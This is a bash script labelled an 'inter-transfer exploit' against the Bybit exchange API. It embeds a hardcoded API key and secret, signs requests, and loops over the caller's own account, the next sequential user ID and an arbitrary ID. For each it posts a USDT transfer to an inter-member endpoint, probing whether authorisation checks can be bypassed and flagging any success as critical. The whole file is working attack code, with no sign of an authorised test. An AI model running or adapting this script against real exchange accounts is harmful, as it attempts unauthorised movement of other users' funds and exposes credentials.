#!/bin/bash
# INTER-TRANSFER EXPLOIT (Bypass Universal Checks)

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"

# Sync Time
OFFSET=$(($(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}20000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

# Get UID
echo "Getting UID..."
IFS='|' read -r ts sig <<< $(sign "")
uid_resp=$(curl -s "$BASE/v5/user/query-api" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 20000")
    
MY_UID=$(echo "$uid_resp" | grep -o '"userID":[0-9]*' | cut -d':' -f2)
echo "UID: $MY_UID"

if [ -z "$MY_UID" ]; then
    MY_UID="527465456"
    echo "Using fallback UID: $MY_UID"
fi

echo "=========================================="
echo "ATTACKING /v5/asset/transfer/inter-transfer"
echo "=========================================="

# Targets: Self, Next UID, Specific Target
TARGETS=("$MY_UID" "$((MY_UID+1))" "12345678")

for target in "${TARGETS[@]}"; do
    UUID=$(cat /proc/sys/kernel/random/uuid)
    
    echo ""
    echo "Trying Transfer: $MY_UID -> $target"
    
    # Payload for INTER-TRANSFER
    # Documentation says it needs coin, amount, fromMemberId, toMemberId
    PAYLOAD="{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"0.01\",\"fromMemberId\":$MY_UID,\"toMemberId\":$target}"
    
    IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")
    
    resp=$(curl -s -X POST "$BASE/v5/asset/transfer/inter-transfer" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 20000" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD")
        
    echo "Response: $resp"
    
    code=$(echo "$resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
    msg=$(echo "$resp" | grep -o '"retMsg":"[^"]*"' | cut -d'"' -f4)
    
    if [ "$code" == "0" ]; then
        echo "ðŸš¨ CRITICAL: SUCCESSFUL TRANSFER!"
    elif [ "$code" == "10005" ]; then
        echo "âŒ Permission Denied (Same as Universal)"
    elif [ "$code" == "131084" ]; then
        echo "âš ï¸  Transfer not supported / Insufficient balance / Not subaccount"
    else
        echo "âš ï¸  Code $code: $msg"
    fi
done
